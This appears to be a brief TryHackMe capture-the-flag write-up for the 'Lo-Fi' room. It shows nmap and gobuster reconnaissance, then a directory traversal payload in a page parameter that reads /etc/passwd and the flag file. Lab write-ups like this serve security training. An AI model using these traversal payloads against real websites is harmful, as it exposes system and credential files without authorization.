### Lo-Fi - TryHackMe🏴󠁧󠁢󠁥󠁮󠁧󠁿

#### 1. First we prove the conexion with a ping.
```bash
 ping -c3 10.128.141.5
```

<img width="913" height="254" alt="image" src="https://github.com/user-attachments/assets/b56702ed-c859-4359-a241-19c38f85f022" />


#### 2. Now we're going to search the open ports with nmap.
```bash
nmap -sCV 10.128.141.5
```

<img width="903" height="392" alt="image" src="https://github.com/user-attachments/assets/0c0ae0b5-674b-4f60-82e9-143f3e53806a" />


#### 3. We do a gobuster for search hidden ports.
```bash
 gobuster dir -u http://10.128.141.5/ \
                          -w /usr/share/seclists/Discovery/Web-Content/common.txt \
                          -x html,zip,php,txt,bak,sh,asp,aspx \
                          -b 404 -t 60
```

#### 4. Now we go to the website.

<img width="998" height="696" alt="image" src="https://github.com/user-attachments/assets/8fbc9b64-62eb-4cd4-b977-ba54b876d668" />

#### 5. Now we prove script at the search.

<img width="1010" height="616" alt="image" src="https://github.com/user-attachments/assets/c5e6f70b-edb6-4a6d-ac9c-4dbf3043f633" />


#### 6. Now we prove for the common directories where we save the passwd.
```html
http://10.128.141.5/?page=../../../etc/passwd
```

<img width="991" height="650" alt="image" src="https://github.com/user-attachments/assets/8649d94c-4d0d-4c7a-a58f-e1dae57b37ac" />


#### 7. We can see the directories of a passwd, now we only have to try the flag.txt
```html
http://10.128.141.5/?page=../../../flag.txt
```

<img width="1040" height="494" alt="image" src="https://github.com/user-attachments/assets/241c1486-3adc-41d0-9c64-ee169ba52939" />


<img width="786" height="545" alt="image" src="https://github.com/user-attachments/assets/576dbd0e-0a63-48cc-8f75-813bc84ee792" />




